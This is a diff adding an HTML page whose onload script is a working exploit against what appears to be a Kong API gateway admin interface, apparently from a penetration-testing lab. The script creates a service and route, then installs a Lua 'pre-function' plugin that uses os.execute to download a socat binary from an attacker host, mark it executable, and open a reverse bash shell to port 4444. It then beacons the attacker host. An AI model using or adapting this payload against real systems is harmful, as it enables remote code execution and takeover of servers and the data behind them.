@@ -1,0 +1,40 @@
+<html>
+<head>
+<script>
+
+function createService() {
+    fetch("http://172.16.16.4:8001/services", {
+      method: "post",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({"name":"zinhart", "url": "http://127.0.0.1/"})
+    }).then(function (route) {
+      createRoute();
+    });
+}
+
+function createRoute() {
+    fetch("http://172.16.16.4:8001/services/zinhart/routes", { 
+      method: "post",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({"paths": ["/zinhart"]})
+    }).then(function (plugin) {
+      createPlugin();
+    });  
+}
+
+function createPlugin() {
+    let p = `os.execute('wget http://192.168.119.163/socat -O /tmp/socat');os.execute('chmod +x /tmp/socat');os.execute('/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.119.163:4444');`;
+    fetch("http://172.16.16.4:8001/services/zinhart/plugins", { 
+      method: "post",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({"name":"pre-function", "config" :{ "access" :[ "local q = string.char(39);local p0 = '/tmp/socat exec:';local p1 = 'bash -li';local p2 = ',pty,stderr,setsid,sigint,sane tcp:192.168.119.163:4444';local p3 = ' &';local payload= p0 .. q .. p1 .. q .. p2 .. p3;os.execute('wget http://192.168.119.163/socat -O /tmp/socat');os.execute('chmod +x /tmp/socat');os.execute(payload);" ]}})
+    }).then(function (callback) {
+      fetch("http://192.168.119.163/callback?setupComplete");
+    });  
+}
+</script>
+</head>
+<body onload='createService()'>
+<div></div>
+</body>
+</html>
